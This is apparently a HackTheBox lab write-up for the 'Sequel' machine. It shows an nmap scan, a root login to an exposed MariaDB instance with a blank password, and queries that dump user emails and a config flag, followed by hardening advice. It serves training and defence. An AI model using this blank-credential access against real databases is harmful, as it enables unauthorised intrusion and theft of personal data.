# Sequel (HTB) - Exposed Database Service & Unauthenticated Access

**Platform:** HackTheBox (Starting Point) | **Target OS:** Linux (Debian 10) | **Difficulty:** Very Easy  
**Focus:** Database Enumeration, OSINT/Banner Grabbing, SQL Syntax, and Misconfigured Access Control (MariaDB/MySQL).

---

## 🎯 Executive Summary
The "Sequel" machine highlights a critical and surprisingly common infrastructure misconfiguration: exposing a backend database directly to a public or untrusted network without authentication. By enumerating an exposed MariaDB instance, we established a `root` session using a blank password. This granted full administrative access to the database schema, allowing for the enumeration of user credentials and the exfiltration of sensitive configuration flags.

---

## 1. Network Reconnaissance & Banner Grabbing

We initiated the engagement with a rapid TCP SYN scan, followed by a targeted service detection scan on the discovered port to extract banner information and version telemetry.

```bash
$ sudo nmap -p 3306 -sV -sC 10.129.95.232
Starting Nmap 7.94SVN
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 67
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, FoundRows, Support41Auth, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression, LongColumnFlag, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, [...]
|_  Auth Plugin Name: mysql_native_password
```

**Threat Intelligence & Telemetry Analysis:**
1. **Version Disclosure:** The string `5.5.5-10.3.27-MariaDB-0+deb10u1` reveals that the target is running **MariaDB 10.3.27** hosted on **Debian 10 (Buster)**. The `5.5.5` prefix is a legacy string used for compatibility with older MySQL clients.
2. **Dangerous Capabilities:** The `SupportsLoadDataLocal` flag is active. From an attacker's perspective, if authentication is bypassed, this capability can be abused to read arbitrary local files from the underlying Linux filesystem (Local File Inclusion via SQL).

---

## 2. Exploitation: Unauthenticated Database Access

Databases should never be exposed to external networks. When they are, they often suffer from default or blank credentials. We attempted to connect to the database as the `root` user without supplying a password.

```bash
$ mysql -h 10.129.95.232 -u root -p
Enter password: [Left Blank - Pressed Enter]
Welcome to the MySQL monitor.  Commands end with ; or \g.
Server version: 5.5.5-10.3.27-MariaDB-0+deb10u1 Debian 10
mysql> 
```
The connection succeeded, confirming a complete failure of access control.

---

## 3. Post-Exploitation: Schema Enumeration & Data Exfiltration

With a `root` database shell, we first confirmed the root cause of the vulnerability by inspecting the `mysql.user` authentication table.

```sql
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+

mysql> USE mysql;
Database changed
mysql> SELECT user, password FROM mysql.user;
+------+----------+
| user | password |
+------+----------+
| root |          |
+------+----------+
1 row in set (0.15 sec)
```
*Finding:* The `password` field for the `root` user was completely empty, explaining the unauthenticated access.

Next, we pivoted to the target-specific database (`htb`) to hunt for sensitive organizational data.

```sql
mysql> USE htb;
Database changed

mysql> SHOW tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+

mysql> SELECT * FROM users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+

mysql> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

We successfully exfiltrated employee email addresses and internal configuration parameters, including the target flag.

---

## 4. Defensive Remediation & Hardening

To secure database infrastructure, SysAdmins must adhere to the following principles:

1. **Network Isolation:** A database should **never** be exposed to the public internet. Edit the MariaDB configuration file (typically `/etc/mysql/mariadb.conf.d/50-server.cnf`) and bind the service strictly to localhost or an internal VPC subnet:
   ```ini
   bind-address = 127.0.0.1
   ```
2. **Enforce Authentication:** Run the built-in security script to set a strong root password, remove anonymous users, and disallow remote root logins:
   ```bash
   sudo mysql_secure_installation
   ```
3. **Firewall Rules:** Block port `3306` at the perimeter firewall (e.g., using `UFW` or `iptables`), allowing access only from the specific Application Server IP that requires database interaction.
